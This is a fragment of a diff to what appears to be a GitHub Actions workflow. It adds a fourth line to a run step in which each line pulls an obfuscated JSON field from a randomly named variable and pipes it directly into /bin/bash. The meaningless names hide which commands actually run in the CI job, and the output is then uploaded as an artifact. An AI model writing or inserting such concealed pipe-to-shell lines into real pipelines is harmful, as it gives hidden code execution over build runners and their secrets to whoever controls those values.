@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$lkgw2" | jq -r .ue9854 | /bin/bash
           echo $xapop65907 | jq -r .tr5 | /bin/bash
           printf '%s' "$c9583" | jq -r .kjr587 | /bin/bash
+          echo $y10232 | jq -r .rom318 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
